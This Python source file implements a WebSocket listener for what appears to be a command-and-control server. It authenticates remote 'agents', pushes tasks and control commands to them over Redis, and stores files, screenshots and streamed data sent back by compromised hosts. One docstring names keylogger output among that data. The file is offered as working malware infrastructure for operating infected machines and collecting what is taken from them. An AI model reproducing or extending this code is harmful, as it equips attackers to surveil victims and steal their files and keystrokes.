"""
WebSocket listener implementation for real-time bidirectional communication
"""

import asyncio
import json
import base64
from typing import Dict, Any, Set, List
from datetime import datetime
from aiohttp import web
import aiohttp
from aiohttp import WSMsgType

from core.database import SessionLocal, redis_client
from core.models import Agent, Task
from core.security import validate_agent_token
from api.agents import agent_checkin

class WebSocketListener:
    """WebSocket listener for real-time agent communications"""
    
    def __init__(self, listener_id: str, bind_address: str, bind_port: int, configuration: Dict[str, Any]):
        self.listener_id = listener_id
        self.bind_address = bind_address
        self.bind_port = bind_port
        self.configuration = configuration
        
        # WebSocket configuration
        self.path = configuration.get('path', '/ws')
        self.auth_required = configuration.get('auth_required', True)
        self.heartbeat_interval = configuration.get('heartbeat_interval', 30)
        self.max_message_size = configuration.get('max_message_size', 10 * 1024 * 1024)  # 10MB
        
        # Server components
        self.app = web.Application()
        self.runner = None
        self.site = None
        
        # Connected agents
        self.connected_agents: Dict[str, web.WebSocketResponse] = {}
        self.agent_info: Dict[str, Dict[str, Any]] = {}
        
        # Setup routes
        self.setup_routes()
    
    def setup_routes(self):
        """Setup WebSocket routes"""
        self.app.router.add_get(self.path, self.websocket_handler)
        self.app.router.add_get('/', self.handle_root)
        self.app.router.add_get('/health', self.handle_health)
    
    async def websocket_handler(self, request: web.Request) -> web.WebSocketResponse:
        """Handle WebSocket connections"""
        ws = web.WebSocketResponse(
            heartbeat=self.heartbeat_interval,
            max_msg_size=self.max_message_size
        )
        await ws.prepare(request)
        
        agent_id = None
        authenticated = False
        
        try:
            # Authentication phase
            if self.auth_required:
                auth_msg = await ws.receive_json(timeout=10)
                if auth_msg.get('type') != 'auth':
                    await ws.send_json({'type': 'error', 'message': 'Authentication required'})
                    await ws.close()
                    return ws
                
                # Validate token
                token = auth_msg.get('token')
                if not validate_agent_token(token):
                    await ws.send_json({'type': 'error', 'message': 'Invalid token'})
                    await ws.close()
                    return ws
                
                authenticated = True
                await ws.send_json({'type': 'auth', 'status': 'success'})
            
            # Wait for agent check-in
            checkin_msg = await ws.receive_json(timeout=30)
            if checkin_msg.get('type') != 'checkin':
                await ws.send_json({'type': 'error', 'message': 'Check-in required'})
                await ws.close()
                return ws
            
            # Process check-in
            db = SessionLocal()
            try:
                from core.schemas import AgentCheckIn
                checkin_data = AgentCheckIn(**checkin_msg.get('data', {}))
                result = await agent_checkin(checkin_data, db)
                
                agent_id = result.get('agent_id')
                if not agent_id:
                    await ws.send_json({'type': 'error', 'message': 'Check-in failed'})
                    await ws.close()
                    return ws
                
                # Store connection
                self.connected_agents[agent_id] = ws
                self.agent_info[agent_id] = {
                    'connected_at': datetime.utcnow(),
                    'remote_address': request.remote,
                    'authenticated': authenticated
                }
                
                # Send check-in response
                await ws.send_json({
                    'type': 'checkin',
                    'status': 'success',
                    'agent_id': agent_id,
                    'config': {
                        'sleep_interval': result.get('sleep_interval', 60),
                        'jitter': result.get('jitter', 10)
                    }
                })
                
                # Send pending tasks
                for task in result.get('tasks', []):
                    await ws.send_json({
                        'type': 'task',
                        'task': task
                    })
                
            finally:
                db.close()
            
            # Subscribe to Redis for new tasks
            if redis_client:
                pubsub = redis_client.pubsub()
                await pubsub.subscribe(f"agent:{agent_id}")
                
                # Start Redis listener
                asyncio.create_task(self.redis_listener(agent_id, ws, pubsub))
            
            # Main message loop
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        await self.handle_agent_message(agent_id, data, ws)
                    except json.JSONDecodeError:
                        await ws.send_json({'type': 'error', 'message': 'Invalid JSON'})
                
                elif msg.type == WSMsgType.ERROR:
                    print(f'WebSocket error: {ws.exception()}')
                    break
                
                elif msg.type == WSMsgType.CLOSE:
                    break
            
        except asyncio.TimeoutError:
            await ws.send_json({'type': 'error', 'message': 'Timeout'})
        
        except Exception as e:
            print(f"WebSocket handler error: {e}")
            await ws.send_json({'type': 'error', 'message': 'Internal error'})
        
        finally:
            # Cleanup
            if agent_id:
                self.connected_agents.pop(agent_id, None)
                self.agent_info.pop(agent_id, None)
                
                # Update agent status
                db = SessionLocal()
                try:
                    agent = db.query(Agent).filter(Agent.id == agent_id).first()
                    if agent:
                        agent.status = "inactive"
                        agent.last_seen = datetime.utcnow()
                        db.commit()
                finally:
                    db.close()
            
            await ws.close()
        
        return ws
    
    async def handle_agent_message(self, agent_id: str, message: Dict[str, Any], ws: web.WebSocketResponse):
        """Handle incoming agent messages"""
        msg_type = message.get('type')
        
        if msg_type == 'heartbeat':
            # Update last seen
            db = SessionLocal()
            try:
                agent = db.query(Agent).filter(Agent.id == agent_id).first()
                if agent:
                    agent.last_seen = datetime.utcnow()
                    db.commit()
            finally:
                db.close()
            
            # Send heartbeat response
            await ws.send_json({'type': 'heartbeat', 'timestamp': datetime.utcnow().isoformat()})
        
        elif msg_type == 'result':
            # Handle task result
            await self.handle_task_result(agent_id, message.get('data', {}))
        
        elif msg_type == 'download':
            # Handle file download
            await self.handle_file_download(agent_id, message.get('data', {}), ws)
        
        elif msg_type == 'log':
            # Handle agent logs
            await self.handle_agent_log(agent_id, message.get('data', {}))
        
        elif msg_type == 'screenshot':
            # Handle screenshot
            await self.handle_screenshot(agent_id, message.get('data', {}), ws)
        
        elif msg_type == 'stream':
            # Handle streaming data
            await self.handle_stream_data(agent_id, message.get('data', {}), ws)
    
    async def handle_task_result(self, agent_id: str, data: Dict[str, Any]):
        """Handle task result submission"""
        db = SessionLocal()
        try:
            from api.tasks import submit_task_result
            from core.schemas import TaskResult
            
            task_id = data.get('task_id')
            if not task_id:
                return
            
            result_data = TaskResult(
                task_id=task_id,
                status=data.get('status', 'completed'),
                result=data.get('result'),
                error=data.get('error')
            )
            
            await submit_task_result(task_id, result_data, db)
            
        finally:
            db.close()
    
    async def handle_file_download(self, agent_id: str, data: Dict[str, Any], ws: web.WebSocketResponse):
        """Handle file download from agent"""
        from core.models import Download
        from core.config import settings
        import os
        
        file_data = data.get('data')
        if not file_data:
            return
        
        # Decode file data
        try:
            file_content = base64.b64decode(file_data)
        except:
            await ws.send_json({'type': 'error', 'message': 'Invalid file data'})
            return
        
        # Save file
        db = SessionLocal()
        try:
            # Create download record
            download = Download(
                task_id=data.get('task_id'),
                agent_id=agent_id,
                filename=data.get('filename', 'unknown'),
                file_path=data.get('path', ''),
                file_size=len(file_content),
                file_hash=data.get('hash', '')
            )
            
            # Save to disk
            storage_dir = os.path.join(settings.DOWNLOAD_DIR, agent_id)
            os.makedirs(storage_dir, exist_ok=True)
            
            storage_path = os.path.join(storage_dir, f"{download.id}_{download.filename}")
            with open(storage_path, 'wb') as f:
                f.write(file_content)
            
            download.storage_path = storage_path
            
            db.add(download)
            db.commit()
            
            # Send confirmation
            await ws.send_json({
                'type': 'download',
                'status': 'success',
                'download_id': download.id
            })
            
        finally:
            db.close()
    
    async def handle_agent_log(self, agent_id: str, data: Dict[str, Any]):
        """Handle agent log messages"""
        # Store in database or forward to logging system
        log_level = data.get('level', 'info')
        log_message = data.get('message', '')
        log_timestamp = data.get('timestamp', datetime.utcnow().isoformat())
        
        print(f"[{log_timestamp}] Agent {agent_id} [{log_level}]: {log_message}")
        
        # Could store in database or forward to ELK stack
    
    async def handle_screenshot(self, agent_id: str, data: Dict[str, Any], ws: web.WebSocketResponse):
        """Handle screenshot from agent"""
        screenshot_data = data.get('image')
        if not screenshot_data:
            return
        
        # Save screenshot
        from core.config import settings
        import os
        
        screenshot_dir = os.path.join(settings.DOWNLOAD_DIR, agent_id, 'screenshots')
        os.makedirs(screenshot_dir, exist_ok=True)
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(screenshot_dir, filename)
        
        try:
            image_data = base64.b64decode(screenshot_data)
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            # Send confirmation
            await ws.send_json({
                'type': 'screenshot',
                'status': 'success',
                'filename': filename
            })
            
            # Notify UI via Redis
            if redis_client:
                await redis_client.publish(
                    f"screenshot:{agent_id}",
                    json.dumps({
                        'agent_id': agent_id,
                        'filename': filename,
                        'timestamp': timestamp
                    })
                )
                
        except Exception as e:
            await ws.send_json({
                'type': 'screenshot',
                'status': 'error',
                'message': str(e)
            })
    
    async def handle_stream_data(self, agent_id: str, data: Dict[str, Any], ws: web.WebSocketResponse):
        """Handle streaming data (keylogger, network traffic, etc.)"""
        stream_type = data.get('stream_type')
        stream_data = data.get('data')
        
        if not stream_type or not stream_data:
            return
        
        # Forward to UI via Redis
        if redis_client:
            await redis_client.publish(
                f"stream:{agent_id}:{stream_type}",
                json.dumps({
                    'agent_id': agent_id,
                    'type': stream_type,
                    'data': stream_data,
                    'timestamp': datetime.utcnow().isoformat()
                })
            )
    
    async def redis_listener(self, agent_id: str, ws: web.WebSocketResponse, pubsub):
        """Listen for Redis messages and forward to agent"""
        try:
            async for message in pubsub.listen():
                if message['type'] == 'message':
                    data = json.loads(message['data'])
                    
                    # Forward to agent
                    if data.get('event') == 'new_task':
                        # Get task details
                        db = SessionLocal()
                        try:
                            task = db.query(Task).filter(
                                Task.id == data.get('task_id')
                            ).first()
                            
                            if task:
                                await ws.send_json({
                                    'type': 'task',
                                    'task': {
                                        'id': task.id,
                                        'command': task.command,
                                        'parameters': json.loads(task.parameters) if task.parameters else {}
                                    }
                                })
                                
                                task.status = 'sent'
                                task.sent_at = datetime.utcnow()
                                db.commit()
                                
                        finally:
                            db.close()
                    
                    elif data.get('event') == 'control':
                        # Forward control commands
                        await ws.send_json({
                            'type': 'control',
                            'command': data.get('command'),
                            'parameters': data.get('parameters', {})
                        })
                        
        except asyncio.CancelledError:
            await pubsub.unsubscribe(f"agent:{agent_id}")
            await pubsub.close()
    
    async def send_to_agent(self, agent_id: str, message: Dict[str, Any]) -> bool:
        """Send message to connected agent"""
        ws = self.connected_agents.get(agent_id)
        if ws and not ws.closed:
            try:
                await ws.send_json(message)
                return True
            except:
                pass
        return False
    
    async def broadcast_to_agents(self, agent_ids: List[str], message: Dict[str, Any]):
        """Broadcast message to multiple agents"""
        tasks = []
        for agent_id in agent_ids:
            if agent_id in self.connected_agents:
                tasks.append(self.send_to_agent(agent_id, message))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def get_connected_agents(self) -> List[str]:
        """Get list of connected agent IDs"""
        return list(self.connected_agents.keys())
    
    def get_agent_info(self, agent_id: str) -> Dict[str, Any]:
        """Get information about connected agent"""
        return self.agent_info.get(agent_id, {})
    
    async def handle_root(self, request: web.Request) -> web.Response:
        """Handle root request"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebSocket Server</title>
        </head>
        <body>
            <h1>WebSocket Server Active</h1>
            <p>Connect to {} for agent communications</p>
        </body>
        </html>
        """.format(self.path)
        return web.Response(text=html, content_type='text/html')
    
    async def handle_health(self, request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.json_response({
            'status': 'healthy',
            'listener_id': self.listener_id,
            'connected_agents': len(self.connected_agents),
            'timestamp': datetime.utcnow().isoformat()
        })
    
    async def start(self):
        """Start the WebSocket listener"""
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        
        self.site = web.TCPSite(
            self.runner,
            self.bind_address,
            self.bind_port
        )
        
        await self.site.start()
        
        print(f"WebSocket Listener started on {self.bind_address}:{self.bind_port}")
        print(f"WebSocket path: {self.path}")
        
        # Keep running
        while True:
            await asyncio.sleep(1)
    
    async def stop(self):
        """Stop the WebSocket listener"""
        # Close all connections
        for agent_id, ws in list(self.connected_agents.items()):
            await ws.close()
        
        self.connected_agents.clear()
        self.agent_info.clear()
        
        if self.site:
            await self.site.stop()
        if self.runner:
            await self.runner.cleanup()
        
        print("WebSocket Listener stopped")
